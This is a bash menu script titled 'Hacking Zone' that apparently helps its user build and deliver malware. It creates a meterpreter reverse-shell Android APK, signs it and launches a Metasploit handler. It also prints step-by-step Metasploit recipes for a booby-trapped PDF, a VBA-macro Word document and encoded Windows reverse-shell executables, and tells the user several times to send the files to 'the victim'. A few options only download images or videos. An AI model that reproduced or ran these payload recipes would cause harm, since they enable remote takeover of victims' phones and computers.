#!/bin/bash
echo "\e[1;41mWelcome! to Hacking Zone....\e[0m" | pv -qL 10
echo ""
echo "Choose Anything you wanna do"
echo "[1] Exploit Android "
echo "[2] Create a Malicious pdf"
echo "[3] Create a Malicious word doc"
echo "[4] Download an Image"
echo "[5] Download a Video"
echo "[6] Encryption"
echo "[]7 Create a virus"
echo "What you wanna Do: \c"
read choice2
case $choice2 in
	1)
	if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi
			cd
			mkdir /home/user1/Hacking-Zone
			cd /home/user1/Hacking-Zone
			echo "Creating an apk...."
			echo "Enter a name for apk:\c"
			read apk
			#sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.237 LPORT=4444 R > ~/Hacking-Zone/$apk.apk
			echo "---------------------------------------------"
			echo "      Apk Created Find it in Home dir"
			echo "---------------------------------------------"
			echo " "
			echo "Did you wanna give it digital signatures(it would be a little long process)[y/n]:\c"
			read hchoice1
			if [ "$hchoice1" = "y" ] || [ "$hchoice1" = "Y" ]; then
				echo "Generating digital keys.....Please give some Information"
				keytool -genkey -v -keystore my-release-key.Keystore -alias app -keyalg RSA -keysize 2048 -validity 10000
				echo ""
				echo "jarsigning apk..."
				cd
				jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore ~/Hacking-Zone/$apk.apk app
				jarsigner -verify -verbose -certs ~/Hacking-Zone/$apk.apk
				echo "Compressing apk's Data...."
				zipalign -v 4 ~/Hacking-Zone/$apk.apk ~/Hacking-Zone/$apk.apk
				echo "---------------------------------------------"
				echo "Check your new apk at Hacking-Zone dir...A new apk file is loaded"
				echo "---------------------------------------------"
			fi
				echo ""
				echo "Send $apk.apk to the victim and apk need to be installed"
				echo "Did you wanna exploit it now[y/n]:\c"
				read hchoice2
			if [ "$hchoice2" = "y" ] || [ "$hchoice2" = "Y" ]; then
				ifconfig
				echo "Put your Public IP here:\c"
				read publicip
				echo "put port no. 4444:\c"
				read port
				echo "Step1: use exploit/multi/handler"
				echo "Step2: set LHOST $publicip"
				echo "Step3: set LPORT $port"
				echo "Step4: exploit"
				msfconsole
			fi
			;;
	2)
			echo "Sure!..."
			echo "---------------------------------------------"
			echo "                USE THESE STEPS              "
			echo "---------------------------------------------"
			echo "Step1: search type:exploit platform:windows adobe pdf"
			echo "Step2: use exploit/windows/fileformat/adobe_pdf_embedded_exe"
			echo "Step3: info"
			echo "Step4: set payload windows/meterpreter/reverse_tcp"
			echo "show options"
			echo "set LHOST 192.168.43.237"
			echo "show options"
			echo "show info"
			echo "set FILENAME filename.pdf"
			echo "exploit"
			echo "mv /root/.msf4/local/Timetable2021.pdf /home/user1"
			echo "use exploit/multi/handler"
			echo "set payload windows/meterpreter/reverse_tcp"
			echo "set lhost 192.168.43.237"
			echo "show info"
			ehco "show options"
			echo "Send pdf file to the victim"
			echo "run"
			msfconsole
			;;
	3)
			echo "Sure!"
			echo "---------------------------------------------"
			echo "                USE THESE STEPS              "
			echo "---------------------------------------------"
			echo "Step1: Firstly go to the views tab and click on the macros"
			echo "Step2: Give a name to the doc and creat the doc."
			echo "Step3: Now it will give you a window remain there"
			echo "Step4: Now go to the kali linux metasploit"
			echo "Step5: In second terminal get your ip addr with ifconfig command"
			echo "Step6: Now in metasploit"
			echo "Step7: use windows/meterpreter/reverse_https"
			echo "Step8: set LHOST <ip_addr>"
			echo "Step9: set LPORT 443"
			echo "Step10: set AutoRunScript post/windows/manage/smart_migrate"
			ehco "Step11: genrate -t vba"
			echo "Step12: It will genrate a script now copy it and past it in the word doc in macros"
			echo "Step13: Save it and send to the victim"
			echo "Step14: Now fo to the metasploit"
			echo "Step15: use exploit/multi/handler"
			echo "Step16: set payload windows/meterpreter/reverse_https"
			echo "Step17: set LHOST <ip_addr>"
			echo "Step 18: set LPORT 443"
			echo "exploit"
			./hacking_zone.sh
			;;

	4)
			echo "Sure!...."
			echo ""
			echo "Enter the link of an image: \c"
			read imglink
			echo "Enter a Name for Image: \c"
			read imgname
			curl $imglink --output $imgname.jpg
			echo "---------------------------------------------"
			echo "             Download Completed"
			echo "---------------------------------------------"
			./hacking_zone.sh
			;;
	5)
			echo "Enter the link of Video: \c"
			read vidlink
			youtube-dl $vidlink
			echo "---------------------------------------------"
			echo "             Download Completed"
			echo "---------------------------------------------"
			./hacking_zone.sh
			;;
	6)
			#echo "Enter text to convert into Binary: \c"
			#read enttext;
			cd && cd Timepass/Binary-cnvrtr && python3 binary-convrtr.py
			sleep 5s
			cd
			./hacking_zone.sh
			;;
	7)
			echo "msfvenom -l payloads"
			echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_addr> LPORT=443 -f exe > name.exe"
			echo "msfvenom -l encoders"
			echo "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 200 -f exe > name2.exe"
			echo "smbclient //<ip_addr>/c$ -U=administrator"
			echo "You can continue ahead"
			./hacking_zone.sh
			;;
	*)
			ehco "It seems you entered wrong input..."
			./hacking_zone.sh
			;;
		esac